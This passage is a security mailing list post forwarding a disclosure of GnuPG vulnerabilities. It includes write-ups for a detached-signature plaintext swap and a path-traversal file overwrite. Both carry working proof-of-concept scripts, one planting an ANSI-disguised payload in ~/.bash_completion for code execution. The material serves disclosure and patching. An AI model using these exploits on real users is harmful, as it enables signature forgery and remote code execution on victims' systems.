Received: (qmail 22479 invoked by uid 550); 28 Dec 2025 04:31:41 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
x-ms-reactions: disallow
Received: (qmail 17626 invoked from network); 28 Dec 2025 04:30:51 -0000
Date: Sun, 28 Dec 2025 05:27:44 +0100
From: Solar Designer <solar@openwall.com>
To: oss-security@lists.openwall.com
Cc: contact@gpg.fail
Message-ID: <20251228042744.GA629@openwall.com>
References: <3318308d-70b1-4ab3-9cca-ab4ea67dd27d@gmail.com>
Mime-Version: 1.0
Content-Type: multipart/mixed; boundary="EVF5PPMfhYS0aIcm"
Content-Disposition: inline
Content-Transfer-Encoding: 8bit
In-Reply-To: <3318308d-70b1-4ab3-9cca-ab4ea67dd27d@gmail.com>
User-Agent: Mutt/1.4.2.3i
Subject: Re: [oss-security] Many vulnerabilities in GnuPG

--EVF5PPMfhYS0aIcm
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline

On Sat, Dec 27, 2025 at 07:29:53PM -0500, Demi Marie Obenour wrote:
> https://gpg.fail lists many vulnerabilities in GnuPG, one of which
> allows remote code execution.  All are zero-days to the best of
> my knowledge.

Thanks.  I wish this were brought in here by the researchers, but since
it was not and since we require actual content here (not just links),
let me take care of this now.  The website has it nicely formatted, so I
also include the HTML versions, which brings the message to just below
the maximum of 1 MiB here.  Who knows how long this website will stay
up, but oss-security archives will probably exist decades later.

The website currently says:

>                          Slides, pocs and patches soon!
> 
>    "in the hurry of leaving i forgot the sites src at home, sorry, had to
>    rewrite the whole thing. expect a nicer site by tomorrow. im patching as
>    we speak."
>    - crackticker (<- to blame)
> 
>     1. Multiple Plaintext Attack on Detached PGP Signatures in GnuPG
>     2. GnuPG Accepts Path Separators and Path Traversals in Literal Data
>        "Filename" Field
>     3. Cleartext Signature Plaintext Truncated for Hash Calculation
>     4. Encrypted message malleability checks are incorrectly enforced causing
>        plaintext recovery attacks
>     5. Memory Corruption in ASCII-Armor Parsing
>     6. Trusted comment injection (minisign)
>     7. Cleartext Signature Forgery in the NotDashEscaped header
>        implementation in GnuPG
>     8. OpenPGP Cleartext Signature Framework Susceptible to Format Confusion
>     9. GnuPG Output Fails To Distinguish Signature Verification Success From
>        Message Content
>    10. Cleartext Signature Forgery in GnuPG
>    11. Radix64 Line-Truncation Enabling Polyglot Attacks
>    12. GnuPG may downgrade digest algorithm to SHA1 during key signature
>        checking
>    13. GnuPG Trust Packet Parsing Enables Adding Arbitrary Subkeys
>    14. Trusted comment Injection (minisign)

Each of the above 14 vulnerabilities has its own web page.  I attach 14
text (converted with ELinks at width 80) and 14 HTML files corresponding
to them.

Also included on the website is the talk video (49 minutes).

This disclosure was part of the below 39C3 talk:

https://fahrplan.events.ccc.de/congress/2025/fahrplan/event/to-sign-or-not-to-sign-practical-vulnerabilities-i

> To sign or not to sign: Practical vulnerabilities in GPG & friends
> Day 1  17:15  One  en  Security
> Dec. 27, 2025 17:15-18:15
> 
> Might contain zerodays. https://gpg.fail/ From secure communications to
> software updates: PGP implementations such as *GnuPG* ubiquitously
> relied on to provide cryptographic assurances. Many applications from
> secure communications to software updates fundamentally rely on these
> utilities. Since these have been developed for decades, one might expect
> mature codebases, a multitude of code audit reports, and extensive
> continuous testing. When looking into various PGP-related codebases for
> some personal use cases, we found these expectations not met, and
> discovered multiple vulnerabilities in cryptographic utilities, namely
> in *GnuPG*, *Sequoia PGP*, *age*, and *minisign*. The vulnerabilities
> have implementation bugs at their core, for example in parsing code,
> rather than bugs in the mathematics of the cryptography itself. A
> vulnerability in a parser could for example lead to a confusion about
> what data was actually signed, allowing attackers without the private
> key of the signer to swap the plain text. As we initially did not start
> with the intent of conducting security research, but rather were looking
> into understanding some internals of key management and signatures for
> personal use, we also discuss the process of uncovering these bugs.
> Furthermore, we touch on the role of the OpenPGP specification, and the
> disclosure process.
> 
> Beyond the underlying mathematics of cryptographic algorithms, there is
> a whole other layer of implementation code, assigning meaning to the
> processed data. For example, a signature verification operation both
> needs robust cryptography and assurance that the verified data is indeed
> the same as was passed into the signing operation. To facilitate the
> second part, software such as GnuPG implement parsing and processing
> code of a standardized format. Especially when implementing a feature
> rich and evolving standard, there is the risk of ambivalent
> specification, and classical implementation bugs.
> 
> The impact of the vulnerabilities we found reaches from various
> signature verification bypasses, breaking encryption in transit and
> encryption at rest, undermining key signatures, to exploitable memory
> corruption vulnerabilities.
> 
> Speakers of this event
> 49016 does many computer adjacent things; it has a talent for breaking
> them, and occasionally does security research for good in its free time.
> 
> Liam is motivated by understanding programs in depth: taking a program
> that runs and making it dance.

Alexander

--EVF5PPMfhYS0aIcm
Content-Type: text/plain; charset=utf-8
Content-Disposition: attachment; filename="01-detached.txt"
Content-Transfer-Encoding: 8bit

         Multiple Plaintext Attack on Detached PGP Signatures in GnuPG

   An attacker can arbitrarily swap the plaintext shown to a GnuPG user, when
   the user verifies a detached signature versus views it with --decrypt.

Impact

   This attack allows deceiving users verifying messages, following GnuPG
   usage best practices about the content of a message signed with a detached
   signature. Note, that it is possible in many scenarios to convert between
   signature types, i.e., convert a different signature type to a detached
   signature

Details

   We take a detached signature containing:

     * the original file
     * a .sig file containing a Signature Packet

   (Alternatively, we can use a full signature and extract the original file
   with --decrypt; this also gives us a pre-made One-Pass Packet for the next
   step.)

   We then overwrite the .sig file with the following packets:

    1. One-Pass Packet for original signature
    2. Literal Packet containing injected, unsigned data
    3. Unmodified Signature Packet for original file
    4. Marker Packet (0x[ca ff 00 00 00 03 50 47 50])

   GnuPG’s main process keeps track of how many data packets it has seen in
   its context:

 /*
  * Object to hold the processing context.
  */
 typedef struct mainproc_context* CTX;

 struct mainproc_context {
   // ...
   struct {
     unsigned int sig_seen : 1; /* Set to true if a signature packet
                                      has been seen. */
     unsigned int data : 1; /* Any data packet seen */
     unsigned int uncompress_failed : 1;
   } any;
 };

   While processing a packet list, the data field is written in the line
   annotated by us with [1] (original code formatting):

 static int
 do_proc_packets (CTX c, iobuf_t a, int keep_dek_and_list)
 {
   // ...
   while ((rc=parse_packet (&parsectx, pkt)) != -1)
     {
       newpkt = -1;
       if (opt.list_packets)
         {
           switch (pkt->pkttype)
             {
             case PKT_PUBKEY_ENC:    proc_pubkey_enc (c, pkt); break;
             case PKT_SYMKEY_ENC:    proc_symkey_enc (c, pkt); break;
             case PKT_ENCRYPTED:
             case PKT_ENCRYPTED_MDC:
             case PKT_ENCRYPTED_AEAD:proc_encrypted (c, pkt); break;
             case PKT_COMPRESSED:    rc = proc_compressed (c, pkt); break;
             default: newpkt = 0; break;
             }
         }
       else if (c->sigs_only)
         {
           switch (pkt->pkttype)
             {
             case PKT_PUBLIC_KEY:
             case PKT_SECRET_KEY:
             case PKT_USER_ID:
             case PKT_SYMKEY_ENC:
             case PKT_PUBKEY_ENC:
             case PKT_ENCRYPTED:
             case PKT_ENCRYPTED_MDC:
             case PKT_ENCRYPTED_AEAD:
               write_status_text( STATUS_UNEXPECTED, "0" );
               rc = GPG_ERR_UNEXPECTED;
               goto leave;

             case PKT_SIGNATURE:   newpkt = add_signature (c, pkt); break;
             case PKT_PLAINTEXT:   proc_plaintext (c, pkt); break;
             case PKT_COMPRESSED:  rc = proc_compressed (c, pkt); break;
             case PKT_ONEPASS_SIG: newpkt = add_onepass_sig (c, pkt); break;
             case PKT_GPG_CONTROL: newpkt = add_gpg_control (c, pkt); break;
             default: newpkt = 0; break;
             }
         }
       else if (c->encrypt_only)
         {
           switch (pkt->pkttype)
             {
             case PKT_PUBLIC_KEY:
             case PKT_SECRET_KEY:
             case PKT_USER_ID:
               write_status_text (STATUS_UNEXPECTED, "0");
               rc = GPG_ERR_UNEXPECTED;
               goto leave;

             case PKT_SIGNATURE:   newpkt = add_signature (c, pkt); break;

             case PKT_SYMKEY_ENC:
             case PKT_PUBKEY_ENC:
               /* In --add-recipients mode set the stop flag as soon as
                * we see the first of these packets.  */
               if (c->ctrl->modify_recipients)
                 parsectx.only_fookey_enc = 1;
               if (pkt->pkttype == PKT_SYMKEY_ENC)
                 proc_symkey_enc (c, pkt);
               else
                 proc_pubkey_enc (c, pkt);
               break;

             case PKT_ENCRYPTED:
             case PKT_ENCRYPTED_MDC:
             case PKT_ENCRYPTED_AEAD: proc_encrypted (c, pkt); break;
             case PKT_PLAINTEXT:   proc_plaintext (c, pkt); break;
             case PKT_COMPRESSED:  rc = proc_compressed (c, pkt); break;
             case PKT_ONEPASS_SIG: newpkt = add_onepass_sig (c, pkt); break;
             case PKT_GPG_CONTROL: newpkt = add_gpg_control (c, pkt); break;
             default: newpkt = 0; break;
             }
         }
       // ...
       if (pkt->pkttype != PKT_SIGNATURE && pkt->pkttype != PKT_MDC)
         c->any.data = (pkt->pkttype == PKT_PLAINTEXT); // [1]
     // ...
         }
       else
         free_packet (pkt, &parsectx);
     }

  // ...

  leave:
   if (!keep_dek_and_list)
     release_list (c);
   return rc;
 }

   In summary:

     * It only allows certain packet types in encrypt_only and sigs_only
     * After each packet, it checks if the packet is not a Signature or MDC
       Packet

          * If so, it sets any.data to whether the latest packet is a Literal
            Data Packet (PKT_PLAINTEXT)

   The intended behavior for the packet types is this: (any.data starts at 0)

     * Detached signatures:

          * Signature Packet: Sig/MDC, skip write. any.data == 0

     * Full signatures:

          * One-Pass Signature Packet: Not Sig/MDC, write pkttype ==
            PKT_PLAINTEXT. any.data = 0
          * Literal Data Packet: Not Sig/MDC, write pkttype == PKT_PLAINTEXT.
            any.data = 1
          * Signature Packet: Sig/MDC, skip write. any.data == 1

     * Cleartext signature (using internal GPG packet):

          * GPG Control Packet: Not Sig/MDC, write pkttype == PKT_PLAINTEXT.
            any.data = 0
          * Literal Data Packet: Not Sig/MDC, write pkttype == PKT_PLAINTEXT.
            any.data = 1
          * Signature Packet: Sig/MDC, skip write. any.data == 1

   However, an attacker can set any.data to 0 by forming an invalid message
   similar to a full signature:

     * One-Pass Signature Packet: Not Sig/MDC, write pkttype ==
       PKT_PLAINTEXT. any.data = 0
     * Literal Data Packet: Not Sig/MDC, write pkttype == PKT_PLAINTEXT.
       any.data = 1
     * Signature Packet: Sig/MDC, skip write. any.data == 1
     * Marker Packet: Not Sig/MDC, write pkttype == PKT_PLAINTEXT. any.data =
       0

   This sets any.data to 0 despite there being a data packet. And since the
   PKT_MARKER type is not covered by the non-exhaustive switch cases, the
   packet can simply be inserted into the message.

   When GnuPG parses the message above, it creates a hash buffer for the
   literal packet above and handles output when processing the packet. This
   happens in the switch case above in the case PKT_PLAINTEXT:
   proc_plaintext(c, pkt); branch, which does the following:

 static void proc_plaintext(CTX c, PACKET* pkt) {
   // ...
   free_md_filter_context(&c->mfx);
   if (gcry_md_open(&c->mfx.md, 0, 0))
     BUG();

   // ...

   if (!rc) {
     /* It we are in --verify mode, we do not want to output the
      * signed text.  However, if --output is also used we do what
      * has been requested and write out the signed data.  */
     rc = handle_plaintext(pt, &c->mfx,
                           (opt.outfp || opt.outfile) ? 0 : c->sigs_only,
                           clearsig);
     if (gpg_err_code(rc) == GPG_ERR_EACCES && !c->sigs_only) {
       /* Can't write output but we hash it anyway to check the
          signature. */
       rc = handle_plaintext(pt, &c->mfx, 1, clearsig);
     }
   }

   if (rc)
     log_error("handle plaintext failed: %s\n", gpg_strerror(rc));
   // ...
 }

   And in handle_plaintext:

 int handle_plaintext(PKT_plaintext* pt, md_filter_context_t* mfx,
                      int nooutput, int clearsig) {
   char* fname = NULL;
   estream_t fp = NULL;

   if (!nooutput) {
     err = get_output_file(pt->name, pt->namelen, pt->buf, &fname, &fp);
     if (err) goto leave;
   }

   // ...
   if (mfx->md) gcry_md_write(mfx->md, buffer, len);
   if (fp) {
     // ...
     if (es_fwrite(buffer, 1, len, fp) != len) {
       // ...
     }
   }
   // ...
 }

   After that code is done, the newly created tree of parsed packets gets
   processed.

   Crucially, the !c->any.data condition is used to determine whether a
   signature is a detached signature or a full signature (as described in the
   comment in the second check).

 static void release_list(CTX c) {
   proc_tree(c, c->list);
   // ...
 }

 static void proc_tree(CTX c, kbnode_t node) {
   // ...
   if (node->pkt->pkttype == PKT_PUBLIC_KEY
     || node->pkt->pkttype == PKT_PUBLIC_SUBKEY) {
     merge_keys_and_selfsig(c->ctrl, node);
     list_node(c, node);
   } else if (node->pkt->pkttype == PKT_SECRET_KEY) {
     merge_keys_and_selfsig(c->ctrl, node);
     list_node(c, node);
   } else if (node->pkt->pkttype == PKT_ONEPASS_SIG) {
     /* Check all signatures.  */
     if (!c->any.data) {
       int use_textmode = 0;

       free_md_filter_context(&c->mfx);
       /* Prepare to create all requested message digests.  */
       rc = gcry_md_open(&c->mfx.md, 0, 0);
       if (rc) goto hash_err;

       /* Fixme: why looking for the signature packet and not the
          one-pass packet?  */
       for (n1 = node; (n1 = find_next_kbnode(n1, PKT_SIGNATURE));)
         gcry_md_enable(
           c->mfx.md, n1->pkt->pkt.signature->digest_algo);

       if (n1 && n1->pkt->pkt.onepass_sig->sig_class == 0x01) use_textmode = 1;

       /* Ask for file and hash it. */
       if (c->sigs_only) {
         if (c->signed_data.used && c->signed_data.data_fd != -1)
           rc = hash_datafile_by_fd(c->mfx.md, NULL,
                                    c->signed_data.data_fd,
                                    use_textmode);
         else
           rc = hash_datafiles(c->mfx.md, NULL,
                               c->signed_data.data_names,
                               c->sigfilename,
                               use_textmode);
       } else {
         rc = ask_for_detached_datafile(c->mfx.md, NULL,
                                        iobuf_get_real_fname(c->iobuf),
                                        use_textmode);
       }

     hash_err: if (rc) {
         log_error("can't hash datafile: %s\n", gpg_strerror(rc));
         return;
       }
     } else if (c->signed_data.used) {
       log_error(_("not a detached signature\n"));
       return;
     }

     for (n1 = node; (n1 = find_next_kbnode(n1, PKT_SIGNATURE));) check_sig_and_print(c, n1);
   } else if (node->pkt->pkttype == PKT_GPG_CONTROL
     && node->pkt->pkt.gpg_control->control == CTRLPKT_CLEARSIGN_START) {
     /* Clear text signed message.  */
     // ...
   } else if (node->pkt->pkttype == PKT_SIGNATURE) {
     // ...
     if (!c->any.data) {
       /* Detached signature */
       // ...
     } else if (c->signed_data.used) {
       log_error(_("not a detached signature\n"));
       return;
     }
     // ...
   } else {
     dump_kbnode(c->list);
     log_error("invalid root packet detected in proc_tree()\n");
     dump_kbnode(node);
   }
 }

   An attacker can construct a packet that is processed by GnuPG in the
   following way:

     * any->data is initialized to 0
     * do_proc_packets loops over the packets:

          * The One-Pass Packet gets processed as usual

               * any->data gets set to 0

          * The Literal Data Packet gets processed by proc_plaintext:

               * It opens the message hash digest buffer mfx.md
               * It calls handle_plaintext:

                    * It reads the content of the literal packet
                    * It writes it into the mfx.md buffer
                    * It writes the literal data packet to the output file

               * any->data gets set to 1

          * The Signature Packet gets processed as usual

               * any->data is untouched

          * The Marker Packet gets processed

               * any->data gets set to 0

     * proc_tree gets called

          * It processes the root (first packet) as an One-Pass Sig Packet,
            and branches
          * It observes any.data as 0, and branches to the detached signature
            code

               * It opens the message hash digest buffer mfx.md, resetting it
               * It looks for a detached datafile and writes it into the
                 mfx.md buffer

          * The signature of our packet gets checked against mfx.md, which
            now contains the detached datafile!

   Therefore, the output is the data from our literal packet, while the
   detached datafile is hashed and verified, while the output is never
   hashed.

  Detailed steps to reproduce

    Scenario

   Alice wants to send Bob a message. Over a trusted channel they exchanged
   and verified their public keys. Over an untrusted channel, on which
   Mallory has an MITM role, Alice sends a the message along with a detached
   signature. Mallory changes the content of the detached signature. Bob
   successfully verifies the authenticity of the message. He additionally
   uses --decrypt (verifies and outputs the message) to view the message.
   Instead, of being shown Alice’s original message, Bob sees the content
   that Mallory placed

    Procedure

   Alice writes and signs the message and sends it to Bob.

 echo Plaintext > plaintext
 gpg --detach-sig plaintext

   During transport Mallory manipulates the message in the following way:

 #!/usr/bin/env rust-script

 //! ```cargo
 //! [dependencies]
 //! sequoia-openpgp = "2.0.0"
 //! simple-base64 = "0.23.2"
 //! ```

 use sequoia_openpgp::packet::{Literal, Marker, OnePassSig};
 use sequoia_openpgp::parse::Parse;
 use sequoia_openpgp::serialize::stream::{Armorer, Message};
 use sequoia_openpgp::serialize::Serialize;
 use sequoia_openpgp::types::DataFormat::Binary;
 use sequoia_openpgp::{Packet, PacketPile};

 fn multi_plain(sig_path: &str, rep: &str) {
     let pile = PacketPile::from_file(sig_path).unwrap();
     let sig = pile.into_children().filter_map(|x| match x {
         Packet::Signature(s) => Some(s), _ => None
     }).next().expect("Needs a signature packet");
     let ops = OnePassSig::try_from(&sig).expect("A one-pass sig to exist");
     let mut lit = Literal::new(Binary);
     let mut body = rep.as_bytes().to_vec();
     body.push('\n' as u8); // just for viewing convenience
     lit.set_body(body);
     let mrk = Marker::default();

     let mut buf = vec![];
     let msg = Message::new(&mut buf);
     let mut msg = Armorer::new(msg).build().unwrap();

     Packet::from(ops).serialize(&mut msg).unwrap();
     Packet::from(lit).serialize(&mut msg).unwrap();
     Packet::from(sig).serialize(&mut msg).unwrap();
     Packet::from(mrk).serialize(&mut msg).unwrap();

     msg.finalize().unwrap();

     std::fs::write(sig_path, buf).unwrap();

     println!("Verify with:\n\tgpg --verify {sig_path}\nExtract with:\n\tgpg --decrypt {sig_path} > out\n\tcat out");
 }

 fn main() {
     let args_raw: Vec<_> = std::env::args().collect();
     let args: Vec<_> = args_raw.iter().map(|x| x.as_ref()).collect();
     match args[1..] {
         ["multi_plain", sig, rep] => multi_plain(sig, rep),
         _ => println!("Use with ./gen.rs multi_plain <sig_path> <replacement text>")
     }
 }

 ./gen.rs multi_plain plaintext.sig Malicious

   Bob verifies the message successfully and gets shown the malicious
   content.

 gpg --verify plaintext.sig plaintext # Verifies
 gpg --decrypt plaintext.sig # Verifies & prints "Malicious"

   Notes:

     * Technically running --verify is not necessary on Bob’s end. It is
       only to show that both code paths get confused by this attack.
       --decrypt also includes verification. To quote from the man page:

 --decrypt
 -d    Decrypt  the file given on the command line (or STDIN if no file is specified) and write it to STDOUT (or the file specified with --output). If
       the decrypted file is signed, the signature is also verified. This command differs from the default operation, as it never writes to the  file‐
       name which is included in the file and it rejects files that don't begin with an encrypted message.

     * Running gpg --verify plaintext.sig prints a warning but still
       successfully verifies

Recommendations

   Immediate fix of exploitation:

 if (pkt->pkttype != PKT_SIGNATURE && pkt->pkttype != PKT_MDC)
   c->any.data |= (pkt->pkttype == PKT_PLAINTEXT);

   If c->any.data is not allowed to turn back to false, exploitation is
   impossible.

   In the long run, the state machine should be reworked. A lot of
   security-critical mechanisms like c->any.data and other multiple plaintext
   mitigations are dependent on state and are measured in brittle ways, e.g.
   by checking for detached vs. full/clear signatures by counting the
   plaintext packets while parsing, instead of checking ahead of time whether
   the shape of the input is sane.

References

   Visible links
   . https://www.gnupg.org/gph/en/manual/x135.html

--EVF5PPMfhYS0aIcm
Content-Type: text/plain; charset=utf-8
Content-Disposition: attachment; filename="02-filename.txt"
Content-Transfer-Encoding: 8bit

  GnuPG Accepts Path Separators and Path Traversals in Literal Data "Filename"
                                     Field

   GnuPG accepts arbitrary file paths in the unsigned Literal Data packet
   filename field and uses that value without sufficient sanitization.

Impact

   In combination with tricking a user with ANSI formatted output that
   changes GnuPG output with deceptive apparent GnuPG logs, this can lead to
   creation or overwrite of any file on the system the user can write to.
   This commonly includes regularly executed scripts and programs leading to
   remote code execution (RCE).

Details

   Literal Data parsing copies namelen bytes from the packet into pt->name
   without sanitizing or restricting directory separators or traversal
   sequences.

     pt->namelen = namelen;
     pt->is_partial = partial;
     if (pktlen) {
         for (i = 0; pktlen > 4 && i < namelen; pktlen--, i++)
             pt->name[i] = iobuf_get_noeof(inp);
     }

   This data is then processed by get_output_file which performs no
   sanitization and treats the file name field as a file path.

   To quote from the GnuPG man page:

     Note also that unless a modern version 5 signature is used the embedded
     filename is not part of the signed data.

   This makes attacks in certain scenarios more likely as an attacker might
   modify/insert this to more easily deceive an inattentive user.

  Detailed steps to reproduce

    Scenario

     * Mallory, an attacker, sends Bob a message with the goal to overwrite
       Bob’s bash completion script to gain remote code execution.
     * Bob follows the relatively secure looking comment in a terminal
       running bash with ANSI support

    Procedure

     * The first command gpg --decrypt pts.enc prepares a deceiving ANSI
       prompt (could be any message that the user is likely to accept)
     * The subsequent gpg pts.enc then overwrites any file, we choose the
       ~/.bash_completion file to gain RCE. We choose ~/.bash_completion as
       it does not exist by default on most systems.
     * Mallory creates malicious message using poc.py (dependencies in the
       appendix section)

 from literal_data import LiteralDataEncoding, LiteralDataPacket
 from packets import Packet, PacketType
 from armor import ArmorSectionType, BEGIN, END, DASHES, crc24, standard_b64encode


 encoding = LiteralDataEncoding.Text

 ld_packet = LiteralDataPacket(
     encoding=encoding,
     file_name="/home/nine/.bash_completion", data=b"""
 #.[K.[Dgpg: WARNING: Message contains no signatures. Continue viewing [Y/n]?.[8m\necho pwned.]2;
 """
 )

 packet = Packet(
     legacy=True,
     packet_type=PacketType.LiteralData,
     body=ld_packet,
 )

 data = bytes(packet)
 header = f"{BEGIN}{ArmorSectionType.PGP_ARMORED_FILE.value}{DASHES}"
 footer = f"{END}{ArmorSectionType.PGP_ARMORED_FILE.value}{DASHES}"

 b64_data = standard_b64encode(data).decode("utf8")
 lines = []
 while len(b64_data) >= 64:
     lines.append(b64_data[:64])
     b64_data = b64_data[64:]
 if b64_data:
     lines.append(b64_data)

 checksum = crc24(data).to_bytes(length=3, byteorder="big")
 b64_checksum = standard_b64encode(checksum).decode("utf8")

 print(header)
 print("Comment: open with `gpg --decrypt pts.enc && gpg pts.enc`" + "\n")
 for line in lines:
     print(line)
 print(f"={b64_checksum}")
 print(footer)

     * Mallory sends the output of python3 poc.py > pts.enc to Bob.
     * Bob naively opens the file using the comment in the message, and
       accepts the prompt as it does not seem to imply any security risk:

 $ gpg --decrypt pts.enc && gpg pts.enc
 gpg: WARNING: Message contains no signatures. Continue viewing [Y/n]?

 $ bash
 pwned$

   Note, that instead of echo pwned we could have set up a reverse shell.

Recommendations

     * GnuPG should warn the user before outputting binary data such as ANSI
       control sequences to the users terminal.
     * GnuPG may consider not using the embedded file name as the default
     * GnuPG should not accept file paths in the filename field
     * Users should be careful when using gpg <filename> and should instead
       specify the intended subcommand.

Appendix

   buffer.py

 class Buffer:
     inner: bytes

     def __init__(self, inner: bytes = b""):
         self.inner = inner

     def __bytes__(self) -> bytes:
         return self.inner

     def __len__(self) -> int:
         return len(self.inner)

     def is_empty(self) -> bool:
         return len(self.inner) == 0

     def push_bytes(self, data: bytes):
         self.inner += bytes(data)

     def push_mpi(self, data: bytes, bits: int | None):
         if bits is None:
             size = len(data)
             pos = 0
             while data[pos] == 0:
                 size -= 8
                 pos += 1
             if data[pos] >= 0x80:
                 pass
             elif data[pos] >= 0x40:
                 size -= 1
             elif data[pos] >= 0x20:
                 size -= 2
             elif data[pos] >= 0x10:
                 size -= 3
             elif data[pos] >= 0x08:
                 size -= 4
             elif data[pos] >= 0x04:
                 size -= 5
             elif data[pos] >= 0x02:
                 size -= 6
             elif data[pos] >= 0x01:
                 size -= 7
         self.push_u16be(bits)
         self.push_bytes(data)

     def push_utf8(self, text: str):
         self.push_bytes(text.encode("utf8"))

     def push_int(self, value: int, count: int, byteorder: str = "big", signed: bool = False):
         self.push_bytes(int(value).to_bytes(count, byteorder=byteorder, signed=signed))

     def push_i8(self, value: int):
         self.push_int(value, 1, signed=True)

     def push_i16be(self, value: int):
         self.push_int(value, 2, byteorder = "big", signed=True)

     def push_i16le(self, value: int):
         self.push_int(value, 2, byteorder = "little", signed=True)

     def push_i32be(self, value: int):
         self.push_int(value, 4, byteorder = "big", signed=True)

     def push_i32le(self, value: int):
         self.push_int(value, 4, byteorder = "little", signed=True)

     def push_i64be(self, value: int):
         self.push_int(value, 8, byteorder = "big", signed=True)

     def push_i64le(self, value: int):
         self.push_int(value, 8, byteorder = "little", signed=True)

     def push_u8(self, value: int):
         self.push_int(value, 1, signed=False)

     def push_u16be(self, value: int):
         self.push_int(value, 2, byteorder = "big", signed=False)

     def push_u16le(self, value: int):
         self.push_int(value, 2, byteorder = "little", signed=False)

     def push_u32be(self, value: int):
         self.push_int(value, 4, byteorder = "big", signed=False)

     def push_u32le(self, value: int):
         self.push_int(value, 4, byteorder = "little", signed=False)

     def push_u64be(self, value: int):
         self.push_int(value, 8, byteorder = "big", signed=False)

     def push_u64le(self, value: int):
         self.push_int(value, 8, byteorder = "little", signed=False)

     def take_bytes(self, count: int) -> bytes:
         value = self.inner[:count]
         self.inner = self.inner[count:]
         return value

     def take_mpi(self) -> tuple[int, bytes]:
         bits = self.take_u16be()
         return (bits, self.take_bytes((bits + 7)//8))

     def take_utf8(self, count: int | None = None) -> str:
         text: str
         if count is None:
             count = self.inner.find(0)
             text = self.take_bytes(count)
             _null = self.take_u8()
         else:
             text = self.take_bytes(count)

         return text.decode("utf8")

     def take_int(self, count: int, byteorder: str = "big", signed: bool = False) -> int:
         return int.from_bytes(
             self.take_bytes(count),
             byteorder=byteorder,
             signed=signed,
         )

     def take_i8(self) -> int:
         return self.take_int(1, signed=True)

     def take_i16be(self) -> int:
         return self.take_int(2, byteorder="big", signed=True)

     def take_i16le(self) -> int:
         return self.take_int(2, byteorder="little", signed=True)

     def take_i32be(self) -> int:
         return self.take_int(4, byteorder="big", signed=True)

     def take_i32le(self) -> int:
         return self.take_int(4, byteorder="little", signed=True)

     def take_i64be(self) -> int:
         return self.take_int(8, byteorder="big", signed=True)

     def take_i64le(self) -> int:
         return self.take_int(8, byteorder="little", signed=True)

     def take_u8(self) -> int:
         return self.take_int(1, signed=False)

     def take_u16be(self) -> int:
         return self.take_int(2, byteorder="big", signed=False)

     def take_u16le(self) -> int:
         return self.take_int(2, byteorder="little", signed=False)

     def take_u32be(self) -> int:
         return self.take_int(4, byteorder="big", signed=False)

     def take_u32le(self) -> int:
         return self.take_int(4, byteorder="little", signed=False)

     def take_u64be(self) -> int:
         return self.take_int(8, byteorder="big", signed=False)

     def take_u64le(self) -> int:
         return self.take_int(8, byteorder="little", signed=False)

   literal_data.py

 from datetime import datetime
 from enum import Enum

 from buffer import Buffer

 class LiteralDataEncoding(int, Enum):
     Binary = ord("b")
     UTF8 = ord("u")
     Text = ord("t")

 class LiteralDataPacket:
     encoding: LiteralDataEncoding | None
     file_name: str
     metadata: int
     data: bytes

     def __init__(
         self,
         encoding: LiteralDataEncoding | None = None,
         file_name: str = "",
         metadata: int = 0,
         data: bytes = b"",
     ):
         self.encoding = encoding
         self.file_name = file_name
         self.metadata = metadata
         self.data = data

     def __str__(self) -> str:
         output = "\n"
         output += f"    encoding: {self.encoding},\n"
         output += f"    file_name: {repr(self.file_name)},\n"

         timestamp = datetime.fromtimestamp(self.metadata)
         output += f"    metadata: 0x{hex(self.metadata)} ({timestamp}),\n"
         output += f"    data({len(self.data)}): {self.data.hex()},\n"
         return output

     def __bytes__(self) -> bytes:
         buffer = Buffer()
         buffer.push_u8(self.encoding)
         buffer.push_u8(len(self.file_name))
         buffer.push_utf8(self.file_name)
         buffer.push_u32be(self.metadata)
         buffer.push_bytes(self.data)

         return bytes(buffer)

   packets.py

 from base64 import b64decode, b64encode
 from enum import Enum
 from sys import argv

 from buffer import Buffer
 from literal_data import LiteralDataEncoding, LiteralDataPacket


 class PacketType(int, Enum):
     PublicKeyEncryptedSessionKey = 1
     Signature = 2
     SymmetricKeyEncryptedSessionKey = 3
     OnePassSignature = 4
     SecretKey = 5
     PublicKey = 6
     SecretSubkey = 7
     CompressedData = 8
     SymmetricallyEncryptedData = 9
     Marker = 10
     LiteralData = 11
     Trust = 12
     UserID = 13
     PublicSubkey = 14

     UserAttribute = 17
     SymmetricallyEncryptedAndIntegrityProtectedData = 18
     ModificationDetectionCode = 19
     Padding = 21


 class Packet:
     legacy: bool
     packet_type: PacketType | None
     body: LiteralDataPacket | bytes

     def __init__(
         self,
         legacy: bool = False,
         packet_type: PacketType | None = None,
         body: LiteralDataPacket | bytes = b""
     ):
         self.legacy = legacy
         self.packet_type = packet_type
         self.body = body

     def __str__(self) -> str:
         prefix = "Legacy" if self.legacy else ""
         return f"{prefix}{self.packet_type}Packet({self.body})"

     def __bytes__(self) -> bytes:
         buffer = Buffer()
         raw_body = bytes(self.body)
         length = len(raw_body)

         if self.legacy:
             length_type = 0

             if length <= 0xff:
                 length_type = 0
             elif length <= 0xffff:
                 length_type = 1
             elif length <= 0xffff_ffff:
                 length_type = 2
             else:
                 length_type = 3

             buffer.push_u8(0x80 + (self.packet_type.value << 2) + length_type)

             match length_type:
                 case 0:
                     buffer.push_u8(length)
                 case 1:
                     buffer.push_u16be(length)
                 case 2:
                     buffer.push_u32be(length)
                 case _:
                     raise Exception("Not implemented")
         else:
             buffer.push_u8(0xc0 + self.packet_type.value)

             if length < 192:
                 buffer.push_u8(length)
             elif length < 8383:
                 length -= 192
                 msb = (length >> 8) + 192
                 lsb = length & 0xff
                 buffer.push_u8(msb)
                 buffer.push_u8(lsb)

         buffer.push_bytes(raw_body)
         return bytes(buffer)

     def from_buffer(self, buffer: Buffer):
         octed = buffer.take_u8()
         if octed >= 0xc0:
             self.legacy = False
             self.packet_type = PacketType(octed & 0x3f)
         elif octed >= 0x80:
             self.legacy = True
             self.packet_type = PacketType((octed & 0x3f) >> 2)
         else:
             raise Exception(f"Invalid Packet ID: {octed}")

         length = 0
         if self.legacy:
             match octed & 0x03:
                 case 0:
                     length = buffer.take_u8()
                 case 1:
                     length = buffer.take_u16be()
                 case 2:
                     length = buffer.take_u32be()
                 case _:
